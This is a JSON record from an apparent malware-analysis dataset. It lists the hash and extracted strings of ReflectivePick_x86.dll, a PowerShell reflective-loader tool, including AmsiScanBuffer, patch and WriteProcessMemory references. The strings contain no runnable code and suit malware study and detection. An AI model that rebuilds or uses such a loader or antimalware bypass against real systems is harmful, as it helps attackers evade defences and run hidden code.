{
    "malware_data": [
        {
            "filename": "7f2a0809944a8ada70af8dca8db7ebd2dcd62fdfa3dea33f36dff97cb5025a04.dll",
            "filetype": "4D5A9000",
            "filesize": "510KB",
            "hash_sha256": "7f2a0809944a8ada70af8dca8db7ebd2dcd62fdfa3dea33f36dff97cb5025a04",
            "strings": [
                "!This program cannot be run in DOS mode.",
                "8\"pJS'q",
                "S'qb$\"p",
                "S'qb$#p",
                "S'qb$$p",
                "S'q6$#p",
                "S'q6$\"p",
                "S'q6$'p",
                "S'q6$",
                "S'q6$%p",
                "S'qRich",
                ".textbss=",
                ".text",
                "`.rdata",
                "@.data",
                ".idata",
                "@.msvcjmc",
                ".00cfg",
                "@.rsrc",
                "@.reloc",
                "LSu>",
                "HPQj",
                "SVWQ",
                "Y_^[",
                "Phpm",
                "index",
                "vtEmpty",
                "vtPSInvokeReturnVal",
                "vtStringArg",
                "bstrStaticMethodName",
                "XZ_^[",
                "patch",
                "Ph@\"",
                "PhT\"",
                "Ph8#",
                "Phh\"",
                "Ph`%",
                "Ph,\"",
                "PhX&",
                "bounds",
                "fLoadable",
                "spType",
                "bstrClassName",
                "spAssembly",
                "bstrAssemblyName",
                "spDefaultAppDomain",
                "spAppDomainThunk",
                "pCorRuntimeHost",
                "pRuntimeInfo",
                "pMetaHost",
                "2_^[]",
                "98~L",
                "93~=W",
                "PRSVWj",
                "YY_^[ZX",
                "u#SP",
                "uHSW",
                "t5SW",
                "s PV",
                "Phts",
                "AXRPQ",
                "QQSV",
                "j1X+",
                "w=h4n",
                ">csm",
                "Y__^[",
                "VSh v",
                "u2VS",
                "WuuSSV",
                "j\\Zf9",
                "PWWW",
                "SVW3",
                "Genu",
                "5ineI",
                "5ntel",
                "t#=`",
                "_^[3",
                "XZ_^",
                "perrinfo",
                "rgwParams",
                "psei",
                "_$AllocaPad$",
                "pDest",
                "nArgErr",
                "excepInfo",
                "vaResult",
                "rgvarg",
                "dispidNamed",
                "dispparams",
                "pcerrinfo",
                "oF f",
                "oV f",
                "o^0f",
                "of@f",
                "onPf",
                "ov`f",
                "o~pf",
                "FGIu",
                "QQSVWd",
                ";p$u",
                "p$^]",
                "8_^]",
                "8csm",
                "hcsm",
                "t2VW",
                "?RCC",
                "?MOC",
                "?csm",
                "_^[]",
                "BVj(j",
                "YYPV",
                "u SW",
                "dSVW",
                ";csm",
                "u$9G",
                "v!8E",
                "u QW",
                "uf_^[",
                ";MOC",
                ";RCC",
                "@u)j",
                "u Qj",
                "@_^[]",
                "9p u\"",
                ":csm",
                "ft&9q",
                "r49z",
                "j<h8#",
                "t0QW",
                "URPQQh0",
                "L$,3",
                "UVWS",
                "[_^]",
                "SVWj",
                "t,CB",
                "tHS3",
                "t69}",
                "w!AP",
                "8@u4@",
                "93tK",
                "YY_^",
                "0t,+",
                "Ct*+",
                "w.t(",
                "<$u.V",
                "8$u V",
                "8?u$",
                "v&j,",
                "<0| <9",
                "`<`t",
                "YYj)",
                "8@uW@",
                "XuM@",
                "$u;8H",
                "YYt1",
                "<_uQ",
                "8_uR",
                "?uLj",
                "j@hp",
                "<@tX",
                "<_uS",
                "7_^]",
                "8?u'@",
                "$u\"8V",
                "8$u>A",
                "9$t8",
                "ukWj<",
                ":@u%B",
                "RtWK",
                "Xu$@",
                "tAVj",
                "0|C3",
                "SVWt",
                "8@t6j",
                "8@u(@",
                "y9SVW",
                "$uTR",
                "jdhP$",
                "QSVW",
                "Wu%j",
                "SVWUj",
                "]_^[",
                ";t$,",
                "UQPXY]Y[",
                "8\"ul",
                "8\"u5",
                "8\"up",
                "8\"u7",
                "dt(f",
                "it\"f",
                "F4_^[]",
                "t=Sj",
                "F4_^[",
                "tKSj",
                "~0Sf",
                "_[^]",
                "~!Sf",
                "<9et",
                "<9xu",
                "up8M",
                "~1*t",
                "~2*t",
                "A1<Fu",
                "<Nu&",
                "<ItC<Lt3<Tt#<h",
                "k<dt",
                "<XuS",
                "A<lt'<tt",
                "<zu1",
                "jj^f;",
                "Tt)jhZf;",
                "Jjl^f;",
                "f90u",
                "SWj P",
                "jAZjX",
                "w>t6;",
                "pwMt?",
                "^ BW",
                "V2jx_f;",
                "jXXf;",
                "jAXf;",
                "jA[f;",
                "PSj W",
                "QSj W",
                "tJSW",
                "F1<at",
                "v(PQ",
                "F1<gt",
                "N @B",
                "QQSVW",
                "jg[jG",
                "N2f;",
                "F2jgYf;",
                "jGYf;",
                "jsXf",
                "V8^[",
                "jg[BjG_",
                "F8SP",
                "j0Zt",
                "F4f9",
                "~4SW",
                "^4WS",
                "s49}",
                "FFG;}",
                "!A ]",
                "8$u6",
                "ui!U",
                "8$u-9",
                "CW9^",
                "9wWj",
                "j$Yf9",
                "x!j$Xf9",
                "SWu[",
                "unWQ",
                "u'9E",
                "C;^8u",
                "9~8~R",
                "G;~8u",
                "9~8~Q",
                ";~8u",
                "0^_[]",
                "8*u ",
                "8*u\"",
                "Hf#E",
                "j Y+",
                "wGt>",
                "YYh@",
                "t#Vh\\",
                "QWWP",
                "A98u",
                "f98u",
                "< t3<",
                "j\"Xf9",
                "j\"Xu",
                "j\"Xf;",
                "j\"_f9y",
                "t f;E",
                "W<=t",
                "t-Wf",
                "=t7j",
                "PPPPP",
                "t3j=",
                "Y_^]",
                "SSSSj",
                "t3SVj",
                "PPPPj",
                "j _;",
                ">_^]",
                "j X+",
                "f90t",
                "f91t",
                "f98t",
                "f9>t",
                "f99t",
                "rqf;u",
                "r_f;u",
                "rMf;u",
                "r;f;u",
                "r)f;",
                "j0Yf;",
                "j:Xf;",
                "r}f;u",
                "rkf;u",
                "rYf;u",
                "rGf;u",
                "r5f;u",
                "r#f;",
                "t5;E",
                "t`;M",
                "rnf;u",
                "r\\f;u",
                "rJf;u",
                "r8f;u",
                "j0Zf;",
                "Qvf;",
                "f;1u",
                "VVVVV",
                "Wu5j",
                "3=8s",
                "^_[]",
                "Wu;j",
                "t0h ",
                "SVhd",
                "t)W3",
                "~1WPQ",
                "u!ht",
                "~);^",
                "FVWj",
                "VWhd",
                "eVhd",
                "FLY;",
                "t!VP",
                "tehd",
                "u$PW",
                "j0Xu",
                "j0Yf",
                "u,PQRS",
                "t5j0",
                "Wj0XPV",
                "SPSVQ",
                "SPjdVQ",
                "80t/",
                "-jd_;",
                "V@j0P",
                "_^[t",
                "QWPV",
                "}'9E",
                " _^[",
                "t,9F",
                "QQVW",
                "u,SP",
                "([_^",
                "?YYk",
                "YY^[",
                "Qh8s",
                "SSSSS",
                " VWh",
                "Af;:u",
                "SWt@jU",
                "f97t",
                "j.Yf;",
                "PVj@W",
                "j.Xf;",
                "_tqPVj@",
                "uQPVj",
                "j,Yf;",
                "YYj,Z",
                "Wj.Y",
                "u,f9F",
                "PSPt",
                " j8Z",
                "F _^[",
                "j;Xf9",
                "8f;9",
                "6j@W",
                "6jUQ",
                "6jUW",
                "u7SS",
                "*?QP",
                "PSSQ",
                "tlj*Yf",
                "j?Yf",
                "PWWQ",
                "WWWWW",
                "<:u ",
                "SSSQ",
                "PWWS",
                "t-f9",
                "zSSSSj",
                "IH;A",
                "SVWh ",
                "9wLt",
                ";3t'",
                "X_^]",
                "j@X]",
                "w(tQ",
                "*tL=+",
                "v>=1",
                "t7=3",
                "w(te",
                "*t`=+",
                "vR=1",
                "tK=3",
                "w#tN",
                "*tI=+",
                "v8=.",
                "v;=1",
                "t4=3",
                "w#tI",
                "*tD=+",
                "v2=.",
                "v6=1",
                "t/=3",
                "f9:t!V",
                "f9:u",
                "SVWW",
                "WSVPP",
                "SWj=V",
                "u{9]",
                "VWj=S",
                "Uf9]",
                "Qf9]",
                "f9<H}",
                "xE;5p",
                "\\0.F;",
                "QQSVj8j@",
                "Y_[^]",
                "xi;5p",
                "xg;5p",
                "90tA",
                "WQSj",
                "PVQR",
                "ARPRQh",
                "j2[;",
                "j?Yj",
                "Y^[]",
                "YY^]",
                "sv+3",
                "sv,3",
                "std;",
                "st[;",
                "7;1u\"3",
                "0;7t",
                ">;9u",
                "wIPS3",
                "stU;",
                "sv3j",
                "Wj _",
                "j _=",
                "sv*S",
                "@( t",
                "CSPj",
                " PjPW",
                "$PjQW",
                "*PjTW",
                "+PjUW",
                ",PjVW",
                "-PjWW",
                ".PjRW",
                "/PjSW",
                "HPjPW",
                "LPjQW",
                "!<;u",
                "GjPW",
                "C0Pj",
                "C4Pj",
                "5Vhd",
                "Pj(W",
                "Pj)W",
                "Pj W",
                "Y_^[]",
                "f92t",
                "SVWf9",
                "9E WW",
                "t1RWV",
                "!FX@",
                "uX9^\\",
                "NX9^`t1",
                "NXf9",
                "9^\\ty",
                ";V\\uYW",
                "PWjUR",
                "tjhx",
                "PjYV",
                "u/9E",
                "u2Vj@h(",
                "f9;u",
                "j@Wh",
                "tjj_S",
                "j@Sj",
                "9^`u",
                ";K\\u",
                "9C`t",
                "9C\\t",
                ";S\\u",
                "9C`u99C\\t4",
                "u2Wj",
                "u29K\\t-",
                "t9Wj",
                ":f;>u",
                "t2;u",
                "WHPh",
                "tnf9",
                "HPh(",
                "t^WjU",
                "j@Sh",
                "w/PV",
                "<0WV",
                "v!WQ",
                "PPPPPPPP",
                "9E(j",
                "PPPPPWS",
                "QQQP",
                "PP9E u:PPVWP",
                "VPRQ",
                "PRPQh",
                "D8(Ht'",
                "(HtMf",
                "Xf9E",
                "(Ht5F",
                "-^_[",
                "IQPV",
                "<v!j",
                "uLh0",
                "t0SV",
                "u<WW",
                "<$tL",
                "|%=2",
                " VWj",
                "QQV3",
                " SVW",
                "j-Xf",
                "j-Yf",
                "SVRQ",
                "etPj",
                "SVtB",
                "C WVP",
                "C YY",
                "uLQQ",
                "$j%j",
                "uvQQ",
                "j5Zf;",
                "H_^[",
                "tHSVWP",
                "N+D$",
                "WVU3",
                ">@s5f",
                "?@s-f",
                "Sj [",
                "^_[3",
                "^PGo",
                "Pc@xB",
                "<W~C",
                "(Nir",
                "E5KV",
                "yp`H",
                "YKuI",
                ")+c6",
                "PowerShellRunner",
                "PowerShellRunner.PowerShellRunner",
                "AmsiScanBuffer",
                "Stack around the variable '",
                "' was corrupted.",
                "The variable '",
                "' is being used without being initialized.",
                "The value of ESP was not properly saved across a function call.  This is usually a result of calling a function declared with one calling convention with a function pointer declared with a different calling convention.",
                "A cast to a smaller data type has caused a loss of data.  If this was intentional, you should mask the source of the cast with the appropriate bitmask.  For example:  ",
                "char c = (i & 0xFF);",
                "Changing the code in this way will not affect the quality of the resulting optimized code.",
                "Stack memory was corrupted",
                "A local variable was used before it was initialized",
                "Stack memory around _alloca was corrupted",
                "Unknown Runtime Check Error",
                "Unknown Filename",
                "Unknown Module Name",
                "Run-Time Check Failure #%d - %s",
                "Stack corrupted near unknown variable",
                "%.2X ",
                "Stack area around _alloca memory reserved by this function is corrupted",
                "Data: <",
                "Allocation number within this function: ",
                "Size: ",
                "Address: 0x",
                "%s%s%p%s%zd%s%d%s%s%s%s%s",
                "A variable is being used without being initialized.",
                "Stack pointer corruption",
                "Cast to smaller type causing loss of data",
                "Stack memory corruption",
                "Local variable used before initialization",
                "Stack around _alloca corrupted",
                "Unknown exception",
                "bad allocation",
                "bad array new length",
                "RegOpenKeyExW",
                "RegQueryValueExW",
                "RegCloseKey",
                "PDBOpenValidate5",
                "bad exception",
                "__based(",
                "__cdecl",
                "__pascal",
                "__stdcall",
                "__thiscall",
                "__fastcall",
                "__vectorcall",
                "__clrcall",
                "__eabi",
                "__swift_1",
                "__swift_2",
                "__swift_3",
                "__ptr64",
                "__restrict",
                "__unaligned",
                "restrict(",
                " new",
                " delete",
                "operator",
                "`vftable'",
                "`vbtable'",
                "`vcall'",
                "`typeof'",
                "`local static guard'",
                "`string'",
                "`vbase destructor'",
                "`vector deleting destructor'",
                "`default constructor closure'",
                "`scalar deleting destructor'",
                "`vector constructor iterator'",
                "`vector destructor iterator'",
                "`vector vbase constructor iterator'",
                "`virtual displacement map'",
                "`eh vector constructor iterator'",
                "`eh vector destructor iterator'",
                "`eh vector vbase constructor iterator'",
                "`copy constructor closure'",
                "`udt returning'",
                "`RTTI",
                "`local vftable'",
                "`local vftable constructor closure'",
                " new[]",
                " delete[]",
                "`omni callsig'",
                "`placement delete closure'",
                "`placement delete[] closure'",
                "`managed vector constructor iterator'",
                "`managed vector destructor iterator'",
                "`eh vector copy constructor iterator'",
                "`eh vector vbase copy constructor iterator'",
                "`dynamic initializer for '",
                "`dynamic atexit destructor for '",
                "`vector copy constructor iterator'",
                "`vector vbase copy constructor iterator'",
                "`managed vector copy constructor iterator'",
                "`local static thread guard'",
                "operator \"\" ",
                "operator co_await",
                "operator<=>",
                " Type Descriptor'",
                " Base Class Descriptor at (",
                " Base Class Array'",
                " Class Hierarchy Descriptor'",
                " Complete Object Locator'",
                "`anonymous namespace'",
                "CV: ",
                "template-parameter-",
                "`template-parameter-",
                "generic-type-",
                "`generic-type-",
                "`non-type-template-parameter",
                "??_C",
                "NULL",
                "`template-type-parameter-",
                "`generic-class-parameter-",
                "`generic-method-parameter-",
                "nullptr",
                "lambda",
                "void",
                "`template-parameter",
                "`vtordispex{",
                "`vtordisp{",
                "`adjustor{",
                "`local static destructor helper'",
                "`template static data member constructor helper'",
                "`template static data member destructor helper'",
                "static ",
                "virtual ",
                "private: ",
                "protected: ",
                "public: ",
                "[thunk]:",
                "extern \"C\" ",
                "char ",
                "short ",
                "int ",
                "long ",
                "unsigned ",
                "void ",
                "volatile ",
                "volatile",
                "std::nullptr_t ",
                "std::nullptr_t",
                "<ellipsis>",
                ",...",
                ",<ellipsis>",
                " noexcept",
                "char",
                "short",
                "long",
                "float",
                "double",
                "bool",
                "__int8",
                "__int16",
                "__int32",
                "__int64",
                "__int128",
                "<unknown>",
                "char8_t",
                "char16_t",
                "char32_t",
                "wchar_t",
                "auto",
                "decltype(auto)",
                "__w64 ",
                "UNKNOWN",
                "signed ",
                "const",
                " volatile",
                "`unknown ecsu'",
                "union ",
                "struct ",
                "class ",
                "coclass ",
                "cointerface ",
                "enum ",
                "const ",
                "cli::array<",
                "cli::pin_ptr<",
                "{flat}",
                "{for ",
                " ?? ",
                "FlsAlloc",
                "FlsFree",
                "FlsGetValue",
                "FlsSetValue",
                "InitializeCriticalSectionEx",
                "(null)",
                "CorExitProcess",
                "AreFileApisANSI",
                "CompareStringEx",
                "EnumSystemLocalesEx",
                "GetActiveWindow",
                "GetDateFormatEx",
                "GetEnabledXStateFeatures",
                "GetLastActivePopup",
                "GetLocaleInfoEx",
                "GetProcessWindowStation",
                "GetSystemTimePreciseAsFileTime",
                "GetTimeFormatEx",
                "GetUserDefaultLocaleName",
                "GetUserObjectInformationW",
                "GetXStateFeaturesMask",
                "IsValidLocaleName",
                "LCMapStringEx",
                "LCIDToLocaleName",
                "LocaleNameToLCID",
                "LocateXStateFeature",
                "MessageBoxA",
                "MessageBoxW",
                "RoInitialize",
                "RoUninitialize",
                "AppPolicyGetProcessTerminationMethod",
                "AppPolicyGetThreadInitializationType",
                "AppPolicyGetShowDeveloperDiagnostic",
                "AppPolicyGetWindowingModel",
                "SetThreadStackGuarantee",
                "SystemFunction036",
                "NAN(SNAN)",
                "nan(snan)",
                "NAN(IND)",
                "nan(ind)",
                "e+000",
                " !\"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`abcdefghijklmnopqrstuvwxyz{|}~",
                "Sunday",
                "Monday",
                "Tuesday",
                "Wednesday",
                "Thursday",
                "Friday",
                "Saturday",
                "January",
                "February",
                "March",
                "April",
                "June",
                "July",
                "August",
                "September",
                "October",
                "November",
                "December",
                "MM/dd/yy",
                "dddd, MMMM dd, yyyy",
                "HH:mm:ss",
                " !\"#$%&'()*+,-./0123456789:;<=>?@abcdefghijklmnopqrstuvwxyz[\\]^_`abcdefghijklmnopqrstuvwxyz{|}~",
                " !\"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`ABCDEFGHIJKLMNOPQRSTUVWXYZ{|}~",
                "d8L2",
                "[aOni*{",
                "@2&@",
                "\"RP(",
                "eLK(w",
                "FEMh",
                "h0'D",
                "owM&",
                "~ $s%r",
                "@b;zO]",
                "$qE}",
                ";*xh",
                "[\"93",
                "iu+-,",
                "\\lo}",
                "obwQ4",
                "&Sgw",
                "?nz(",
                "=87M",
                "v2!L.2",
                "X/4B",
                "k=yI",
                "^<V7w",
                "W&|.",
                "1#INF",
                "1#QNAN",
                "1#SNAN",
                "1#IND",
                "log10",
                "lzZ?",
                "asin",
                "acos",
                "sqrt",
                "?5Wg4p",
                "Nv$^",
                "BC .=",
                "(lX ",
                "#{ =",
                "`~R=",
                "}s\"=",
                "%S#[k",
                "\"B <1=",
                "\\-!y",
                "#.X'=",
                "i9+=",
                "sinh",
                "cosh",
                "tanh",
                "atan",
                "atan2",
                "ceil",
                "floor",
                "fabs",
                "modf",
                "ldexp",
                "_cabs",
                "_hypot",
                "fmod",
                "frexp",
                "_logb",
                "_nextafter",
                "RSDS<M",
                "C:\\Users\\User\\Downloads\\PowerTools-master\\PowerTools-master\\PowerPick\\bin\\x86\\Debug\\ReflectivePick.pdb",
                "ReflectivePick_x86.dll",
                "_ReflectiveLoader@4",
                "VoidFunc",
                "`.rsrc",
                "BSJB",
                "v2.0.50727",
                "#Strings",
                "#GUID",
                "#Blob",
                "<Module>",
                "PowerShellRunner.dll",
                "CustomPSHost",
                "CustomPSHostUserInterface",
                "CustomPSRHostRawUserInterface",
                "mscorlib",
                "System",
                "Object",
                "System.Management.Automation",
                "System.Management.Automation.Host",
                "PSHost",
                "PSHostUserInterface",
                "PSHostRawUserInterface",
                "InvokePS",
                ".ctor",
                "Guid",
                "_hostId",
                "get_InstanceId",
                "get_Name",
                "Version",
                "get_Version",
                "get_UI",
                "System.Globalization",
                "CultureInfo",
                "get_CurrentCulture",
                "get_CurrentUICulture",
                "EnterNestedPrompt",
                "ExitNestedPrompt",
                "NotifyBeginApplication",
                "NotifyEndApplication",
                "SetShouldExit",
                "InstanceId",
                "Name",
                "CurrentCulture",
                "CurrentUICulture",
                "System.Text",
                "StringBuilder",
                "_rawUi",
                "ConsoleColor",
                "Write",
                "WriteLine",
                "WriteDebugLine",
                "WriteErrorLine",
                "WriteVerboseLine",
                "WriteWarningLine",
                "ProgressRecord",
                "WriteProgress",
                "get_Output",
                "System.Collections.Generic",
                "Dictionary`2",
                "PSObject",
                "System.Collections.ObjectModel",
                "Collection`1",
                "FieldDescription",
                "Prompt",
                "ChoiceDescription",
                "PromptForChoice",
                "PSCredential",
                "PSCredentialTypes",
                "PSCredentialUIOptions",
                "PromptForCredential",
                "get_RawUI",
                "ReadLine",
                "System.Security",
                "SecureString",
                "ReadLineAsSecureString",
                "Output",
                "RawUI",
                "Size",
                "_windowSize",
                "Coordinates",
                "_cursorPosition",
                "_cursorSize",
                "_foregroundColor",
                "_backgroundColor",
                "_maxPhysicalWindowSize",
                "_maxWindowSize",
                "_bufferSize",
                "_windowPosition",
                "_windowTitle",
                "get_BackgroundColor",
                "set_BackgroundColor",
                "get_BufferSize",
                "set_BufferSize",
                "get_CursorPosition",
                "set_CursorPosition",
                "get_CursorSize",
                "set_CursorSize",
                "FlushInputBuffer",
                "get_ForegroundColor",
                "set_ForegroundColor",
                "BufferCell",
                "Rectangle",
                "GetBufferContents",
                "get_KeyAvailable",
                "get_MaxPhysicalWindowSize",
                "get_MaxWindowSize",
                "KeyInfo",
                "ReadKeyOptions",
                "ReadKey",
                "ScrollBufferContents",
                "SetBufferContents",
                "get_WindowPosition",
                "set_WindowPosition",
                "get_WindowSize",
                "set_WindowSize",
                "get_WindowTitle",
                "set_WindowTitle",
                "BackgroundColor",
                "BufferSize",
                "CursorPosition",
                "CursorSize",
                "ForegroundColor",
                "KeyAvailable",
                "MaxPhysicalWindowSize",
                "MaxWindowSize",
                "WindowPosition",
                "WindowSize",
                "WindowTitle",
                "command",
                "exitCode",
                "foregroundColor",
                "backgroundColor",
                "value",
                "message",
                "sourceId",
                "record",
                "caption",
                "descriptions",
                "choices",
                "defaultChoice",
                "userName",
                "targetName",
                "allowedCredentialTypes",
                "options",
                "rectangle",
                "source",
                "destination",
                "clip",
                "fill",
                "origin",
                "contents",
                "System.Reflection",
                "AssemblyTitleAttribute",
                "AssemblyDescriptionAttribute",
                "AssemblyConfigurationAttribute",
                "AssemblyCompanyAttribute",
                "AssemblyProductAttribute",
                "AssemblyCopyrightAttribute",
                "AssemblyTrademarkAttribute",
                "AssemblyCultureAttribute",
                "System.Runtime.InteropServices",
                "ComVisibleAttribute",
                "GuidAttribute",
                "AssemblyVersionAttribute",
                "AssemblyFileVersionAttribute",
                "System.Diagnostics",
                "DebuggableAttribute",
                "DebuggingModes",
                "System.Runtime.CompilerServices",
                "CompilationRelaxationsAttribute",
                "RuntimeCompatibilityAttribute",
                "System.Management.Automation.Runspaces",
                "InitialSessionState",
                "CreateDefault",
                "AuthorizationManager",
                "set_AuthorizationManager",
                "RunspaceFactory",
                "Runspace",
                "CreateRunspace",
                "Open",
                "Pipeline",
                "CreatePipeline",
                "CommandCollection",
                "get_Commands",
                "AddScript",
                "Command",
                "get_Item",
                "PipelineResultTypes",
                "MergeMyResults",
                "Invoke",
                "IDisposable",
                "Dispose",
                "System.Threading",
                "Thread",
                "get_CurrentThread",
                "NotImplementedException",
                "NewGuid",
                "Append",
                "String",
                "Concat",
                "AppendLine",
                "ToString",
                "set_Width",
                "set_Height",
                "set_X",
                "set_Y",
                "n[u5",
                "Copyright ",
                "  2014",
                "$dfc4eebb-7384-4db5-9bad-257203029bd9",
                "1.0.0.0",
                "WrapNonExceptionThrows",
                "RSDSE@",
                "RmP>#",
                "e:\\Documents\\Visual Studio 2013\\Projects\\UnmanagedPowerShell\\PowerShellRunner\\obj\\Debug\\PowerShellRunner.pdb",
                "_CorDllMain",
                "mscoree.dll",
                "                          ",
                "abcdefghijklmnopqrstuvwxyz",
                "ABCDEFGHIJKLMNOPQRSTUVWXYZ",
                ".?AVbad_alloc@std@@",
                ".?AVexception@std@@",
                ".?AVbad_array_new_length@std@@",
                ".?AV_com_error@@",
                ".?AVbad_exception@std@@",
                ".?AVtype_info@@",
                ".?AVDNameNode@@",
                ".?AVcharNode@@",
                ".?AVpcharNode@@",
                ".?AVpDNameNode@@",
                ".?AVDNameStatusNode@@",
                ".?AVpairNode@@",
                "GetCurrentProcess",
                "WriteProcessMemory",
                "GetProcAddress",
                "LoadLibraryW",
                "KERNEL32.dll",
                "OLEAUT32.dll",
                "CLRCreateInstance",
                "GetCurrentThreadId",
                "IsDebuggerPresent",
                "RaiseException",
                "MultiByteToWideChar",
                "WideCharToMultiByte",
                "UnhandledExceptionFilter",
                "SetUnhandledExceptionFilter",
                "TerminateProcess",
                "IsProcessorFeaturePresent",
                "QueryPerformanceCounter",
                "GetCurrentProcessId",
                "GetSystemTimeAsFileTime",
                "InitializeSListHead",
                "GetStartupInfoW",
                "GetModuleHandleW",
                "GetLastError",
                "HeapAlloc",
                "HeapFree",
                "GetProcessHeap",
                "VirtualQuery",
                "FreeLibrary",
                "LocalFree",
                "RtlUnwind",
                "InterlockedPushEntrySList",
                "InterlockedFlushSList",
                "GetModuleFileNameW",
                "LoadLibraryExW",
                "SetLastError",
                "EncodePointer",
                "EnterCriticalSection",
                "LeaveCriticalSection",
                "DeleteCriticalSection",
                "InitializeCriticalSectionAndSpinCount",
                "TlsAlloc",
                "TlsGetValue",
                "TlsSetValue",
                "TlsFree",
                "ExitProcess",
                "GetModuleHandleExW",
                "GetDateFormatW",
                "GetTimeFormatW",
                "CompareStringW",
                "LCMapStringW",
                "GetLocaleInfoW",
                "IsValidLocale",
                "GetUserDefaultLCID",
                "EnumSystemLocalesW",
                "GetStdHandle",
                "GetFileType",
                "GetCurrentThread",
                "FindClose",
                "FindFirstFileExW",
                "FindNextFileW",
                "IsValidCodePage",
                "GetACP",
                "GetOEMCP",
                "GetCPInfo",
                "GetCommandLineA",
                "GetCommandLineW",
                "GetEnvironmentStringsW",
                "FreeEnvironmentStringsW",
                "SetEnvironmentVariableW",
                "SetConsoleCtrlHandler",
                "FlushFileBuffers",
                "WriteFile",
                "GetConsoleOutputCP",
                "GetConsoleMode",
                "SetStdHandle",
                "GetFileSizeEx",
                "SetFilePointerEx",
                "GetStringTypeW",
                "HeapSize",
                "HeapReAlloc",
                "CloseHandle",
                "ReadFile",
                "ReadConsoleW",
                "CreateFileW",
                "WriteConsoleW",
                "OutputDebugStringW",
                "DecodePointer",
                "<?xml version='1.0' encoding='UTF-8' standalone='yes'?>",
                "<assembly xmlns='urn:schemas-microsoft-com:asm.v1' manifestVersion='1.0'>",
                "  <trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\">",
                "    <security>",
                "      <requestedPrivileges>",
                "        <requestedExecutionLevel level='asInvoker' uiAccess='false' />",
                "      </requestedPrivileges>",
                "    </security>",
                "  </trustInfo>",
                "</assembly>",
                "[6e6",
                "<0t0",
                "1!2F2",
                "8a8r8",
                "2\"2(292C2m2",
                "6V7|7",
                "8<8P8",
                "8\"999]9b9y9",
                ":9:>:e:",
                "80B0",
                "0e1k1q1w1}1",
                "5,515>5",
                "6/6G6",
                "7(8B8%989P9",
                "98:?:L:",
                ";1<U<q<",
                "<,=y=",
                ">I?Y?",
                "a0g0z0",
                "1-1K1Q1l1",
                "2%2@2x2",
                "3-3A3J3U3\\3y3",
                "4\"424B4R4[4",
                "5%5-555@5E5K5U5_5r5w5",
                "6'6/676B6G6M6W6",
                "6#727;7H7q7",
                ":F:l:{:",
                "; ;*;",
                "<5<F<v<",
                "<U=u=",
                "=%>t>z>",
                "?4?9?L?q?",
                "0,010U0Z0h0p0",
                "1A1Q1V1d1o1",
                "2&2A2H2S2Z2e2l2",
                "5+50575W5x5",
                "5(6]6q6x6",
                ":*:3:b:k:t:",
                "<P=^=",
                "=7>E>",
                "?=?f?",
                "g0v1",
                "2f3k3",
                "5$5`5",
                "7>8i8",
                ":(:^;y;",
                "<B<^=->4>`>g>",
                "4H5l5",
                ":d:h:l:p:t:x:|:",
                "; ;$;(;,;0;4;8;`;d;h;l;p;t;x;|;",
                "< <$<(<,<0<4<",
                "1*1D1",
                "1/2K2d2",
                "3=3`3l3.4t4",
                "7K7P7T7X7\\7",
                "586=6",
                "95;H;",
                "=B=|=",
                ">!><>d>x>",
                "?E?V?h?",
                "3/3u3",
                "6;7P7",
                "7.8C8",
                "= >5>v>",
                "3M4w4",
                "658h8",
                "8)9A9",
                "0)151r1",
                "5+5<5M5]5n5{5",
                "6$646j6x6",
                "7E7T7s7",
                "858Z8_8r8",
                ":*:@:",
                "<#=v=",
                ">;>U>v>",
                "%0;0d0w0",
                "1:1Z1",
                "1=2A2E2I2M2Q2U2Y2]2u2y2}2",
                "4#5<5L536",
                "7H8Q8{8",
                ":9:O:\\:",
                "040=0",
                "2?3s3",
                "5-5^5n5",
                "7l7p7t7x7|7",
                "859c9k9",
                "9k:v:",
                ";@<p<",
                "0'1e1s1",
                "1G2a2",
                "3E3V3",
                "414S4r4",
                "6M6X6q6",
                "657@7t7",
                "9\"9?9J9e9",
                ":&:*:.:2:6:::>:Z:^:b:f:J<",
                "?;?P?j?|?",
                "X0v0",
                "1(1T1",
                "1*21292",
                "3?4N4m4",
                "5U5m5v5",
                "5E6w6",
                "7)8C8",
                ":1:i:v:",
                "<I=T=_=m=y=",
                "=6>F>Y>",
                "?5?;?[?",
                "0I0y0",
                "1(1C1Q1X1^1g1s1",
                "2*252=2F2",
                "2W3]3",
                "3.454",
                "5-5@5k5",
                "636]6a6e6i6m6q6u6y6",
                "939L9p9",
                "<(<A<E<I<M<Q<U<Y<]<a<[=f=",
                "? ?o?",
                "1$1A1",
                "3/3W3b3",
                "4E4S4d4",
                "5~617x7",
                "8+:P:X:^:d:j:",
                ";#;<;H;P;^;d;m;u;",
                "<(</<5<Y<`<",
                "=$=:=?=D=j=",
                "=%>N>",
                "?)?E?f?k?p?",
                "0'0A0F0K0i0s0",
                "1\"1F1",
                ":a:w:",
                ";*;9;G;S;_;m;};",
                "<-<:<H<V<a<",
                "1Y2l9I;1=M?",
                "t1Q3",
                "= >4>d>x>",
                "?0?D?s?",
                "0<0P0",
                "1D2H2L2P2T2X2\\2`2",
                "5!5%5)5",
                "8S9W9[9_9c9g9k9o98:",
                ";:<><B<F<J<N<R<V<",
                ">'?+?/?3?7?;???C?",
                "= >'>L>P>T>X>\\>[?",
                "`4y4",
                "6A7Z7",
                "9(:E:",
                "4P4V4\\4b4h4n4t4z4",
                "8V9$:",
                "j2?8J8e8x8",
                "969Q9\\9",
                ":K>a>",
                ".0U0b0q0",
                "1T2[2m2",
                "3)323C3U3",
                "4V5_5",
                "5K6U6Z6`6",
                ">(>3>A>L>V>o>",
                ">\"?O?V?",
                "5>5i5",
                "6K7P7Z7_7j7u7",
                ">k>o>z>",
                "?'?2?8?C?I?W?w?",
                "0E0J0~0",
                "1<1m1",
                "F1X1y1",
                ":2:::d:k:q:x:}:",
                ";\";=;P;",
                "<7<<<B<H<N<d<i<n<",
                "=$=)=.=D=I=N=d=i=n=",
                ">$>)>.>D>I>N>d>i>n>",
                "?$?)?.?D?I?N?d?i?n?",
                "0$0)0.0D0I0N0d0i0n0",
                "1%1K1",
                "2J2d2",
                "3*3W3\\3a3~3",
                "4G4L4Q4n4",
                "666;6@6[6j6",
                "7?7D7I7a7",
                "8?8T8",
                "9;9K9~9",
                "9*:N:",
                ";D;h;m;r;",
                "<:<?<D<_<",
                "=1=>=C=H=e=",
                "?/?E?R?W?e?",
                "3!8Y8",
                "9D9V9",
                "9V:f:",
                "8D;l;",
                ";L<b<",
                "<I=L>f>",
